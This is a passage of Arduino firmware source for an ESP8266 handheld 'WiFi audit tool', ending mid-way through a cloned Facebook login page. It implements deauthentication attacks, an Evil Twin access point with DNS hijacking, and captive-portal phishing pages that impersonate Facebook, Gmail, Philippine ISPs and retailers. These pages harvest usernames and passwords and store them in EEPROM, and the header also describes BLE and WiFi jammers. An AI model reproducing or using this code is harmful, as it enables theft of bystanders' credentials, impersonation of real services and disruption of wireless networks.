/*
 * ================================================================
 *  AxG Haven — WiFi Audit Tool V0.1
 *  AxG Haven-Labs | haven004
 * ================================================================
 *  PINOUTS
 * ----------------------------------------------------------------
 *  OLED (I2C):
 *    SDA    → GPIO14 (D5)
 *    SCL    → GPIO12 (D6)
 *
 *  NRF24L01 (SPI):
 *    CE     → GPIO2  (D4)
 *    CSN    → GPIO4  (D2)  ← shared with BTN_UP pin
 *    SCK    → GPIO14 (D5)  (SPI clock)
 *    MOSI   → GPIO13 (D7)
 *    MISO   → GPIO12 (D6)
 *    VCC    → 3.3V (use capacitor 10µF recommended)
 *    GND    → GND
 *
 *  Buttons (wire to GND, INPUT_PULLUP):
 *    UP     → GPIO4  (D2)
 *    DOWN   → GPIO0  (D3)
 *    SELECT → GPIO3  (RX)
 * ================================================================
 *  FEATURES
 * ----------------------------------------------------------------
 *  ATTACK
 *   — WiFi network scan with animated radar loading screen
 *   — Deauth attack (continuous 802.11 deauth/disassoc burst)
 *   — EvilTwin captive portal — clones target SSID on same channel
 *   — Combo mode: Deauth + EvilTwin running simultaneously
 *   — EEPROM save/load of cracked credentials (survives reboot)
 *   — Live client count while EvilTwin is active
 *   — Serial DUMP of captured credentials from Results menu
 *   — Captured username shown in results (for themes with user field)
 *
 *  PORTAL THEMES  (8 total)
 *   — Router Repair   : generic firmware-error page (password only)
 *   — ISP Login       : PLDT / Globe / Sky portal (user + password)
 *   — WiFi Login      : generic network access page (password only)
 *   — Facebook        : pixel-accurate Meta mobile login (user + password)
 *   — Gmail           : Google account sign-in page (user + password)
 *   — Google WiFi     : Google network captive portal (password only)
 *   — Jollibee Guest  : Jollibee free WiFi portal (mobile + password)
 *   — SM WiFi         : SM Supermalls SMAC portal (email/SMAC + password)
 *
 *  RF RADIO  (NRF24L01)
 *   — BLE Jammer  : hops ch37/38/39 (NRF offsets 2/26/80) — BLE only
 *   — WiFi Jammer : hops all 11 WiFi channels (2412–2462 MHz offsets)
 *   — BLE Scanner : passive scan on advertising channels 37/38/39
 *                   with animated pulse loading screen per channel
 *   — BLE Monitor : live 3-panel scrolling waveform (ch37/38/39)
 *                   RPD + packet hit count, hop with UP/DOWN
 *
 *  MONITORING
 *   — WiFi Channel Monitor : full-screen Spacehuhn-style scrolling
 *                            packet waveform, deauth overlay, ch 1-13
 *                            UP/DOWN to hop channels live
 *   — Signal-strength bars (4-bar RSSI) in network list
 *   — Scrolling ticker for long SSIDs in network list
 *   — Status screen: target, deauth/twin state, theme, jammer, clients
 *
 *  UI / UX
 *   — Scrollable main menu (9 items, UP/DOWN with ^ v indicators)
 *   — Scrollable theme menu (8 themes, scroll indicators)
 *   — Animated radar sweep for WiFi scan (~2.4s, 18 frames)
 *   — Animated BLE pulse per channel (~2s, 8 frames × 3 channels)
 *   — Word-wrap helper for long SSID/PASS/USER display on OLED
 *   — Direct launch attacks (no confirm prompt — instant on SELECT)
 *   — All menus use spiStop/spiStart to share SPI bus with NRF24
 * ================================================================
 */

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>
#include "RF24.h"

extern "C" {
#include "user_interface.h"
}

/* ================================================================
   PIN DEFINITIONS
   ================================================================ */
#define BTN_UP      4
#define BTN_DOWN    0
#define BTN_SELECT  3
#define DEBOUNCE_MS 200

/* ================================================================
   EEPROM LAYOUT
   ================================================================ */
#define EEPROM_SIZE        97
#define EEPROM_MAGIC       0xAB
#define EEPROM_ADDR_MAGIC  0
#define EEPROM_ADDR_SSID   1
#define EEPROM_ADDR_PASS   33

/* ================================================================
   BUTTON HANDLER
   ================================================================ */
struct Btn {
  uint8_t       pin;
  bool          lastRaw;
  bool          pressed;
  unsigned long lastAcceptedMs;
  bool          waitingRelease;
};

Btn bUp     = { BTN_UP,     HIGH, false, 0, false };
Btn bDown   = { BTN_DOWN,   HIGH, false, 0, false };
Btn bSelect = { BTN_SELECT, HIGH, false, 0, false };

void readBtn(Btn &b) {
  b.pressed = false;
  bool cur  = digitalRead(b.pin);
  if (b.lastRaw == HIGH && cur == LOW)  b.waitingRelease = true;
  if (b.waitingRelease && b.lastRaw == LOW && cur == HIGH) {
    b.waitingRelease = false;
    unsigned long now = millis();
    if (now - b.lastAcceptedMs >= DEBOUNCE_MS) {
      b.pressed        = true;
      b.lastAcceptedMs = now;
    }
  }
  b.lastRaw = cur;
}

void pollButtons() {
  readBtn(bUp);
  readBtn(bDown);
  readBtn(bSelect);
}

/* ================================================================
   OLED
   ================================================================ */
#define SCREEN_WIDTH  128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define ROW_H    10
#define HDR_H     9
#define CONTENT_X 4

/* ================================================================
   RF24 RADIO
   ================================================================ */
RF24 radio(2, 4);   // CE=GPIO2, CSN=GPIO4 (shared with BTN_UP — note: CE on D4)

bool    radioOk       = false;
uint8_t radioChannel  = 45;
bool    jammerRunning = false;

/* ================================================================
   BLE SCAN DATA
   ================================================================ */
struct BLEResult {
  uint8_t nrfChannel;   // NRF24 channel index
  uint8_t bleChannel;   // BLE advertising channel (37/38/39)
  uint8_t hits;
  int8_t  rssi;
};

BLEResult bleResults[3];
bool      bleScanDone = false;
int       bleSel      = 0;
#define   BLE_SCAN_MS  3000
#define   BLE_ITEMS    4     // 3 channels + Back

/* ================================================================
   JAMMER
   ================================================================ */
enum JamMode { JAM_BLE = 0, JAM_WIFI = 1 };
JamMode  jamMode = JAM_BLE;

const char* jamModeLabels[] = {
  "BLE  (ch37/38/39)",
  "WiFi (ch1-11)"
};

// BUG FIX: was uint8_t storing 2412+ (overflow). These are NRF24 offsets
// from 2400 MHz for the 11 standard WiFi channels: ch1=2412→offset12, etc.
const uint8_t wifiJamChannels[] = {
  12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62
};
const uint8_t WIFI_JAM_CH_COUNT = sizeof(wifiJamChannels);

/* ================================================================
   BLE CHANNEL MAP  (NRF24 offset → BLE advertising channel)
   ================================================================ */
static const uint8_t BLE_CH_NRF[3]  = {  2, 26, 80 };
static const uint8_t BLE_CH_BLE[3]  = { 37, 38, 39 };

/* ================================================================
   SPI / OLED SHARE HELPERS
   ================================================================ */
void spiStop() {
  if (radioOk) {
    radio.powerDown();
    SPI.end();
    delay(10);
  }
}

void spiStart() {
  if (radioOk) {
    SPI.begin();
    radio.powerUp();
    delay(5);
    if (jammerRunning) {
      radio.startConstCarrier(RF24_PA_MAX, radioChannel);
    }
  }
}

/* ================================================================
   DRAW HELPERS
   ================================================================ */

// Word-wrap print. Returns Y position after last printed line.
// lineH = px between lines, maxLines=0 = unlimited
int printWrapped(const char* text, int x, int startY, int lineH, int maxLines = 0) {
  char buf[128];
  strncpy(buf, text, 127); buf[127] = '\0';

  int col  = x, y = startY, lines = 0;
  int maxW = SCREEN_WIDTH - x - 2;
  const int cw = 6;

  char word[32]; int wi = 0;
  int len = strlen(buf);

  auto flush = [&]() {
    if (!wi) return;
    word[wi] = '\0';
    int wpx = wi * cw;
    if (col + wpx > x + maxW && col > x) { y += lineH; col = x; lines++; }
    if (!maxLines || lines < maxLines) { display.setCursor(col, y); display.print(word); }
    col += wpx; wi = 0;
  };

  for (int i = 0; i <= len; i++) {
    char c = buf[i];
    if (c == ' ' || c == '\0') { flush(); if (c == ' ') col += cw; }
    else { word[wi++] = c; if (wi >= 31) flush(); }
  }
  return y + lineH;
}

void drawHeader(const char* title) {
  display.fillRect(0, 0, SCREEN_WIDTH, HDR_H, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 1);          // y=1 → 1 px top pad inside 9 px bar
  display.setTextSize(1);
  display.print(title);
  display.setTextColor(WHITE);
}

void drawMenuRow(int y, bool selected, const char* text) {
  if (selected) {
    display.fillRect(0, y, SCREEN_WIDTH, ROW_H, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(CONTENT_X, y + 2);
  display.setTextSize(1);
  display.print(text);
  display.setTextColor(WHITE);
}

// 4-bar RSSI signal indicator at pixel (x,y)
void drawRssiBars(int x, int y, int8_t rssi) {
  int bars = 0;
  if      (rssi > -60) bars = 4;
  else if (rssi > -70) bars = 3;
  else if (rssi > -80) bars = 2;
  else if (rssi > -90) bars = 1;

  for (int i = 0; i < 4; i++) {
    int bx = x + i * 4;
    int bh = 2 + i * 2;
    int by = y + 8 - bh;
    if (i < bars) display.fillRect(bx, by, 3, bh, WHITE);
    else          display.drawRect(bx, by, 3, bh, WHITE);
  }
}

/* ================================================================
   ANIMATED LOADING SCREENS
   ================================================================ */

// Radar sweep animation for WiFi scan (~2.4 s, 18 frames)
void animateRadarScan() {
  const int cx = 64, cy = 38, r = 18;
  // Blip positions scattered around radar area
  const int blipX[] = { 72, 54, 78, 62, 68, 50, 76 };
  const int blipY[] = { 32, 46, 42, 26, 50, 30, 28 };

  for (int frame = 0; frame < 18; frame++) {
    ESP.wdtFeed();
    display.clearDisplay();

    // ── Header ──────────────────────────────────────────────
    display.fillRect(0, 0, SCREEN_WIDTH, HDR_H, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(2, 1);
    display.print("AxG Haven");
    display.setCursor(74, 1);
    display.print("WiFi Scan");
    display.setTextColor(WHITE);

    // ── Radar rings ─────────────────────────────────────────
    display.drawCircle(cx, cy, r,     WHITE);
    display.drawCircle(cx, cy, r / 2, WHITE);
    // Dashed inner ring (every 3rd pixel)
    for (int deg = 0; deg < 360; deg += 6) {
      float a = deg * (PI / 180.0f);
      int px = cx + (int)((r * 3 / 4) * cos(a));
      int py = cy + (int)((r * 3 / 4) * sin(a));
      display.drawPixel(px, py, WHITE);
    }
    // Cross-hairs
    display.drawFastHLine(cx - r, cy, r * 2, WHITE);
    display.drawFastVLine(cx, cy - r, r * 2, WHITE);

    // ── Sweep line + trailing ghost lines ───────────────────
    float angle = (frame * 20.0f) * (PI / 180.0f);
    int ex = cx + (int)(r * cos(angle));
    int ey = cy + (int)(r * sin(angle));
    display.drawLine(cx, cy, ex, ey, WHITE);

    for (int t = 1; t <= 4; t++) {
      float ta = ((frame - t) * 20.0f) * (PI / 180.0f);
      int tex = cx + (int)((r - t * 3) * cos(ta));
      int tey = cy + (int)((r - t * 3) * sin(ta));
      if (t < 3) display.drawLine(cx, cy, tex, tey, WHITE);
      else       display.drawPixel(tex, tey, WHITE); // faintest tail
    }

    // ── Blips appear as sweep passes them ───────────────────
    for (int b = 0; b < 7; b++) {
      int blipAngle = (b * 51 + 11) % 360;
      if (frame * 20 > blipAngle) {
        int age = frame * 20 - blipAngle;
        // Blip pulses: full dot then just outline
        if (age < 40) display.fillCircle(blipX[b], blipY[b], 2, WHITE);
        else          display.drawCircle(blipX[b], blipY[b], 1, WHITE);
      }
    }

    // ── Footer ──────────────────────────────────────────────
    // Progress bar along the bottom
    int prog = (frame * SCREEN_WIDTH) / 17;
    display.drawFastHLine(0, 63, SCREEN_WIDTH, WHITE);
    display.fillRect(0, 62, prog, 2, WHITE);
    // Animated dots
    display.setCursor(CONTENT_X, 55);
    const char* dots[] = { "Scanning.", "Scanning..", "Scanning..." };
    display.print(dots[frame % 3]);
    // Frame counter right-aligned
    char fr[6]; snprintf(fr, sizeof(fr), "%d/18", frame + 1);
    display.setCursor(100, 55);
    display.print(fr);

    display.display();
    delay(120);
  }
}

// Pulse animation for BLE scan (~2 s, 8 frames per channel)
void animateBLEPulse(int channelIndex) {
  const int cx = 64, cy = 38;

  for (int frame = 0; frame < 8; frame++) {
    ESP.wdtFeed();
    display.clearDisplay();

    // ── Header ──────────────────────────────────────────────
    display.fillRect(0, 0, SCREEN_WIDTH, HDR_H, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(2, 1);
    display.print("AxG Haven");
    display.setCursor(70, 1);
    display.print("BLE Scan");
    display.setTextColor(WHITE);

    // ── Concentric expanding rings ───────────────────────────
    for (int ring = 0; ring < 4; ring++) {
      int rr = ((frame + ring * 2) % 8) * 4;
      if (rr > 1 && rr < 26) {
        display.drawCircle(cx, cy, rr, WHITE);
        // Thicken the innermost visible ring
        if (rr < 6) display.drawCircle(cx, cy, rr + 1, WHITE);
      }
    }
    // ── BLE symbol (simplified "B" shape with curves) ───────
    // Centre dot
    display.fillCircle(cx, cy, 3, WHITE);
    // Small antenna lines radiating out
    for (int a = 0; a < 4; a++) {
      float ang = a * 90.0f * (PI / 180.0f) + PI / 4;
      int lx = cx + (int)(6 * cos(ang));
      int ly = cy + (int)(6 * sin(ang));
      display.drawPixel(lx, ly, WHITE);
      display.drawPixel(lx + (int)(cos(ang)), ly + (int)(sin(ang)), WHITE);
    }

    // ── Channel badge (inverted pill) ────────────────────────
    char chBuf[8];
    snprintf(chBuf, sizeof(chBuf), "CH %d", BLE_CH_BLE[channelIndex]);
    display.fillRect(46, cy - 4, 36, 10, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(48, cy - 2);
    display.print(chBuf);
    display.setTextColor(WHITE);

    // ── Footer: progress bar + animated dots ─────────────────
    display.drawFastHLine(0, 63, SCREEN_WIDTH, WHITE);
    // Per-channel progress within 3-channel scan
    int totalFrames = 24;  // 8 frames × 3 channels
    int doneFrames  = channelIndex * 8 + frame;
    int prog        = (doneFrames * SCREEN_WIDTH) / totalFrames;
    display.fillRect(0, 62, prog, 2, WHITE);

    display.setCursor(CONTENT_X, 55);
    const char* dots[] = { "Listening.", "Listening..", "Listening...", "Listening.." };
    display.print(dots[frame % 4]);

    display.display();
    delay(160);
  }
}

/* ================================================================
   NETWORK DATA
   ================================================================ */
typedef struct {
  String  ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int8_t  rssi;
} _Network;

_Network _networks[16];
_Network _selectedNetwork;
int      networkCount = 0;

/* ================================================================
   ATTACK STATE
   ================================================================ */
bool   hotspot_active = false;
bool   deauth_active  = false;
bool   combo_active   = false;

String _correct       = "";
String _tryPassword   = "";
String _capturedUser  = "";   // captured username (ISP theme only)
int    _attemptCount  = 0;

unsigned long deauth_now    = 0;
unsigned long verifyStart   = 0;
bool          verifyPending = false;

// Ticker scroll
unsigned long tickerLast   = 0;
int           tickerOffset = 0;

/* ================================================================
   PORTAL THEME
   ================================================================ */
enum PortalTheme {
  THEME_ROUTER = 0,
  THEME_ISP,
  THEME_WIFI,
  THEME_FACEBOOK,
  THEME_GMAIL,
  THEME_GOOGLE_WIFI,
  THEME_JOLLIBEE,
  THEME_SM
};
PortalTheme portalTheme = THEME_ROUTER;
const char* themeNames[] = {
  "Router Repair",
  "ISP Login",
  "WiFi Login",
  "Facebook",
  "Gmail",
  "Google WiFi",
  "Jollibee Guest",
  "SM WiFi"
};
#define THEME_COUNT 8

/* ================================================================
   WIFI CHANNEL MONITOR STATE  (Spacehuhn-style full-screen waveform)
   ================================================================ */
#define WIFI_MON_CHANNELS  13
#define WM_COLS           128   // one px column = full screen width
#define WM_GRAPH_Y         11   // top of graph (below 10-px status bar)
#define WM_GRAPH_H         53   // 11+53=64

volatile uint32_t wifiMonPktCount    = 0;   // total pkt counter (ISR)
volatile uint32_t wifiMonDeauthCount = 0;   // deauth/disassoc counter (ISR)

uint8_t  wifiMonWave[WM_COLS];              // waveform heights (px)
uint8_t  wifiMonDeauthWave[WM_COLS];        // deauth overlay heights (px)
uint8_t  wifiMonWaveHead  = 0;              // circular write head
uint32_t wifiMonPktPerSec = 0;             // rate for status bar
int      wifiMonChannel   = 1;
unsigned long wifiMonLastUpdate = 0;
#define  WIFI_MON_INTERVAL_MS 300

// BLE monitor geometry (unchanged)
#define BM_GY  10
#define BM_GH  38
#define BM_SEC 40
#define BM_BAR  2

// Promiscuous callback: count all frames, flag deauth (0xC0) / disassoc (0xA0)
void ICACHE_RAM_ATTR wifiMonSnifferCB(uint8_t *buf, uint16_t len) {
  if (!buf || len < 13) return;
  wifiMonPktCount++;
  uint8_t fc0 = buf[12];   // RadiotTap=12 bytes; byte 12 = frame-ctrl LSB
  if (fc0 == 0xC0 || fc0 == 0xA0) wifiMonDeauthCount++;
}

/* ================================================================
   BLE CHANNEL MONITOR STATE
   ================================================================ */
#define BLE_MON_HISTORY     20    // bar graph columns
#define BLE_MON_INTERVAL_MS 400   // ms between waveform updates

#define BM_WAVE_COLS 40   // scrolling columns per panel
uint8_t  bleMonWave[3][BM_WAVE_COLS];  // per-channel waveform
uint8_t  bleMonWaveHead  = 0;          // shared write head
int      bleMonChannel   = 0;  // 0/1/2 → ch37/38/39
unsigned long bleMonLastUpdate = 0;


/* ================================================================
   MENU STATE
   ================================================================ */
enum MenuState {
  MENU_MAIN,
  MENU_NETWORKS,
  MENU_ATTACK,
  MENU_THEME,
  MENU_STATUS,
  MENU_RESULT,
  MENU_RADIO,
  MENU_BLE,
  MENU_WIFI_MON,
  MENU_BLE_MON
};
MenuState currentMenu = MENU_MAIN;

int  mainSel      = 0;
int  mainTop      = 0;   // BUG FIX: scroll window top for main menu (was static local)
int  netTop       = 0;   // BUG FIX: scroll window top for network menu
int  netSel       = 0;
int  attackSel    = 0;
int  radioSel     = 0;
int  themeSel     = 0;
bool statusDirty   = true;  // BUG FIX: only redraw status when needed

/* ================================================================
   FORWARD DECLARATIONS
   ================================================================ */
void startJammer(JamMode mode);
void stopJammer();
void runJammer();
void drawMainMenu();
void drawNetworkMenu();
void drawAttackMenu();
void drawThemeMenu();
void drawStatusMenu();
void drawResultMenu();
void drawRadioMenu();
void drawBLEMenu();
void drawWifiMonMenu();
void drawBleMonMenu();
void stopEvilTwin();
void stopDeauth();
void handlePortal();
void handleResult();
void handleRedirect();
void performBLEScan();
void handleBLEMenu();
void handleRadioMenu();
void handleWifiMonMenu();
void handleBleMonMenu();
void saveToEEPROM();
void loadFromEEPROM();
void startWifiMon();
void stopWifiMon();
void startBleMon();
void stopBleMon();

extern const unsigned char axgHavenBoot[];

/* ================================================================
   CAPTIVE PORTAL / WEB SERVER
   ================================================================ */
const byte DNS_PORT = 53;
IPAddress  apIP(192, 168, 4, 1);
DNSServer  dnsServer;
ESP8266WebServer webServer(80);

/* ================================================================
   EEPROM HELPERS
   ================================================================ */
void saveToEEPROM() {
  EEPROM.write(EEPROM_ADDR_MAGIC, EEPROM_MAGIC);
  for (int i = 0; i < 31; i++)
    EEPROM.write(EEPROM_ADDR_SSID + i,
      i < (int)_selectedNetwork.ssid.length() ? _selectedNetwork.ssid[i] : 0);
  EEPROM.write(EEPROM_ADDR_SSID + 31, 0);
  for (int i = 0; i < 63; i++)
    EEPROM.write(EEPROM_ADDR_PASS + i,
      i < (int)_correct.length() ? _correct[i] : 0);
  EEPROM.write(EEPROM_ADDR_PASS + 63, 0);
  EEPROM.commit();
  Serial.println(F("[+] Saved to EEPROM"));
}

void loadFromEEPROM() {
  if (EEPROM.read(EEPROM_ADDR_MAGIC) != EEPROM_MAGIC) return;
  char ssid[32], pass[64];
  for (int i = 0; i < 32; i++) ssid[i] = EEPROM.read(EEPROM_ADDR_SSID + i);
  for (int i = 0; i < 64; i++) pass[i] = EEPROM.read(EEPROM_ADDR_PASS + i);
  ssid[31] = '\0'; pass[63] = '\0';
  _selectedNetwork.ssid = String(ssid);
  _correct = String(pass);
  Serial.print(F("[+] Loaded EEPROM: "));
  Serial.print(ssid); Serial.print(" / "); Serial.println(pass);
}

/* ================================================================
   WIFI SCAN (with animated radar loading screen)
   ================================================================ */
void performScan() {
  spiStop();
  wifi_promiscuous_enable(0);
  WiFi.disconnect();
  delay(100);

  // Animated radar loading screen
  animateRadarScan();

  int n = WiFi.scanNetworks(false, true);
  ESP.wdtFeed();

  for (int i = 0; i < 16; i++) { _Network tmp; _networks[i] = tmp; }
  networkCount = 0;

  if (n > 0) {
    networkCount = (n > 16) ? 16 : n;
    for (int i = 0; i < networkCount; i++) {
      _networks[i].ssid  = WiFi.SSID(i);
      _networks[i].rssi  = (int8_t)WiFi.RSSI(i);
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      _networks[i].ch    = WiFi.channel(i);
    }
  }
  WiFi.scanDelete();

  // Found result flash — styled splash
  spiStop();
  display.clearDisplay();
  display.setTextSize(1);

  // Header
  display.fillRect(0, 0, SCREEN_WIDTH, HDR_H, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 1);
  display.print("Scan Complete");
  display.setTextColor(WHITE);

  // AP count (large-ish centred)
  display.setCursor(28, 16);
  display.print("Found ");
  display.print(networkCount);
  display.print(" APs");

  // Mini channel-distribution bar chart
  // Background grid line
  display.drawFastHLine(4, 50, 120, WHITE);
  for (int i = 0; i < networkCount; i++) {
    int ch = _networks[i].ch;
    if (ch >= 1 && ch <= 13) {
      int bx = 4 + (ch - 1) * 9;
      // Small filled bar
      display.fillRect(bx + 1, 44, 7, 6, WHITE);
    }
  }
  // Channel tick labels
  display.setCursor(4,  52); display.print("1");
  display.setCursor(31, 52); display.print("4");
  display.setCursor(58, 52); display.print("7");
  display.setCursor(81, 52); display.print("10");
  display.setCursor(112,52); display.print("13");

  display.display();
  delay(1000);

  tickerOffset = 0;
  spiStart();
}

/* ================================================================
   EVIL TWIN
   ================================================================ */
void setupWebRoutes() {
  webServer.on("/",                           handlePortal);
  webServer.on("/result",                     handleResult);
  webServer.on("/hotspot-detect.html",        handleRedirect);
  webServer.on("/library/test/success.html",  handleRedirect);
  webServer.on("/success.html",               handleRedirect);
  webServer.on("/generate_204",               handleRedirect);
  webServer.on("/gen_204",                    handleRedirect);
  webServer.on("/mobile/status.php",          handleRedirect);
  webServer.on("/ncsi.txt",                   handleRedirect);
  webServer.on("/connecttest.txt",            handleRedirect);
  webServer.on("/redirect",                   handleRedirect);
  webServer.onNotFound(handleRedirect);
}

void startEvilTwin() {
  deauth_active = false;
  wifi_promiscuous_enable(0);
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  delay(300);

  WiFi.mode(WIFI_AP_STA);
  delay(100);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  bool apOk = WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch);
  delay(500);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  setupWebRoutes();
  webServer.begin();

  hotspot_active = true;
  verifyPending  = false;
  _tryPassword   = "";
  _attemptCount  = 0;

  if (combo_active) { deauth_active = true; deauth_now = millis(); }

  spiStop();
  display.clearDisplay();
  drawHeader(apOk ? "EvilTwin ON" : "AP FAILED!");
  display.setTextSize(1);
  display.setTextColor(WHITE);
  const char* tn3[] = { "Rtr", "ISP", "WiF", "FB ", "Gml", "GWF", "JLB", "SM " };

  char ssidLbl[48];
  snprintf(ssidLbl, sizeof(ssidLbl), "SSID:%s", _selectedNetwork.ssid.c_str());
  int y = printWrapped(ssidLbl, CONTENT_X, 13, 9);

  display.setCursor(CONTENT_X, y);
  display.print("CH:"); display.print(_selectedNetwork.ch);
  display.print(" Thm:"); display.print(tn3[portalTheme]);
  y += 9;

  display.setCursor(CONTENT_X, y);
  display.print(combo_active ? "COMBO mode ON" :
                apOk         ? "Waiting victim..." : "Check target/ch!");
  y += 9;
  if (y <= 57) { display.setCursor(CONTENT_X, y); display.print("IP:192.168.4.1"); }
  display.display();
  spiStart();
  statusDirty = true;
}

void stopEvilTwin() {
  hotspot_active = false;
  verifyPending  = false;
  combo_active   = false;
  deauth_active  = false;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  delay(200);
  WiFi.mode(WIFI_STA);
  statusDirty = true;
}

void stopDeauth() {
  deauth_active = false;
  statusDirty   = true;
}

/* ================================================================
   PORTAL THEMES
   ================================================================ */
const char CP_STYLE[] PROGMEM =
  "body{margin:0;padding:0;font-family:Arial,sans-serif;font-size:16px;}"
  "nav{padding:14px;color:#fff;font-size:1.1em;}"
  "nav b{display:block;font-size:1.4em;margin-bottom:4px;}"
  ".box{padding:16px;}"
  "input[type=password],input[type=text]{"
    "width:100%;padding:10px;margin:8px 0;box-sizing:border-box;"
    "border:1px solid #999;border-radius:4px;font-size:1em;}"
  "button{"
    "width:100%;padding:12px;margin-top:8px;font-size:1em;"
    "border:none;border-radius:4px;color:#fff;cursor:pointer;}";

void servePortalRouter() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>")); webServer.sendContent_P(CP_STYLE);
  webServer.sendContent(F("nav{background:#c0392b;}button{background:#c0392b;}</style></head><body>"));
  webServer.sendContent("<nav><b>" + _selectedNetwork.ssid + "</b> Connection Error &mdash; Automatic Repair Required</nav>");
  webServer.sendContent(F("<div class='box'><h3>Router Login</h3>"
    "<p>A firmware issue was detected. Enter your WiFi password to allow the router to repair itself.</p>"
    "<form method='GET' action='/'>"
    "<input type='password' name='password' placeholder='WiFi Password' autocomplete='off'>"
    "<button type='submit'>Repair &amp; Reconnect</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalISP() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>")); webServer.sendContent_P(CP_STYLE);
  webServer.sendContent(F("nav{background:#1a5276;}button{background:#1a5276;}</style></head><body>"));
  webServer.sendContent("<nav><b>PLDT Home / Globe / Sky</b> Customer Portal &mdash; Authentication Required</nav>");
  webServer.sendContent(F("<div class='box'><h3>Internet Service Login</h3>"
    "<p>Your session has expired. Please re-enter your WiFi password to restore your connection.</p>"
    "<form method='GET' action='/'>"
    "<input type='text' name='_u' placeholder='Username / Account No.' autocomplete='off'>"
    "<input type='password' name='password' placeholder='WiFi Password' autocomplete='off'>"
    "<button type='submit'>Login</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalWifi() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>")); webServer.sendContent_P(CP_STYLE);
  webServer.sendContent(F("nav{background:#27ae60;}button{background:#27ae60;}</style></head><body>"));
  webServer.sendContent("<nav><b>" + _selectedNetwork.ssid + "</b> Secure WiFi Access</nav>");
  webServer.sendContent(F("<div class='box'><h3>Connect to WiFi</h3>"
    "<p>Enter your network password to continue.</p>"
    "<form method='GET' action='/'>"
    "<input type='password' name='password' placeholder='Network Password' autocomplete='off'>"
    "<button type='submit'>Connect</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalFacebook() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0;}"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
      "background:#fff;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;"
      "align-items:center;padding:20px 16px;}"
    ".lang{color:#737373;font-size:15px;margin-bottom:24px;}"
    ".logo-wrap{margin-bottom:28px;}"
    ".logo-circle{width:72px;height:72px;background:#1877f2;border-radius:50%;"
      "display:flex;align-items:center;justify-content:center;}"
    ".logo-f{color:#fff;font-size:44px;font-weight:900;font-family:Georgia,serif;"
      "line-height:1;padding-bottom:6px;}"
    ".form-wrap{width:100%;max-width:420px;}"
    "input{width:100%;padding:16px 14px;margin-bottom:12px;border:1.5px solid #ddd;"
      "border-radius:12px;font-size:16px;color:#1c1e21;background:#fff;outline:none;"
      "-webkit-appearance:none;}"
    "input:focus{border-color:#1877f2;}"
    ".btn-login{width:100%;padding:16px;background:#1877f2;color:#fff;border:none;"
      "border-radius:24px;font-size:17px;font-weight:700;cursor:pointer;margin-bottom:16px;}"
    ".forgot{text-align:center;font-size:15px;font-weight:700;"
      "color:#1877f2;margin-bottom:32px;display:block;}"
    ".divider{width:100%;max-width:420px;border:none;border-top:1px solid #e0e0e0;"
      "margin-bottom:24px;}"
    ".btn-create{width:100%;max-width:420px;padding:16px;background:#fff;"
      "color:#1877f2;border:1.5px solid #1877f2;border-radius:24px;"
      "font-size:16px;font-weight:600;cursor:pointer;margin-bottom:28px;}"
    ".meta-wrap{display:flex;align-items:center;gap:6px;margin-bottom:12px;}"
    ".meta-logo{font-size:22px;color:#0082fb;font-weight:900;letter-spacing:-1px;}"
    ".meta-txt{font-size:18px;color:#1c1e21;font-weight:500;}"
    ".footer-links{color:#737373;font-size:13px;}"
    ".footer-links a{color:#737373;text-decoration:none;margin:0 6px;}"
    "</style></head><body>"));
  webServer.sendContent(F("<div class='lang'>English (US)</div>"
    "<div class='logo-wrap'>"
      "<div class='logo-circle'><div class='logo-f'>f</div></div>"
    "</div>"
    "<div class='form-wrap'>"
    "<form method='GET' action='/'>"
    "<input type='text' name='_u' placeholder='Mobile number or email' autocomplete='off'>"
    "<input type='password' name='password' placeholder='Password' autocomplete='off'>"
    "<button class='btn-login' type='submit'>Log in</button>"
    "</form>"
    "<a class='forgot' href='#'>Forgot password?</a>"
    "</div>"
    "<hr class='divider'>"
    "<button class='btn-create' onclick='return false;'>Create new account</button>"
    "<div class='meta-wrap'>"
      "<span class='meta-logo'>&#x221e;</span>"
      "<span class='meta-txt'>Meta</span>"
    "</div>"
    "<div class='footer-links'>"
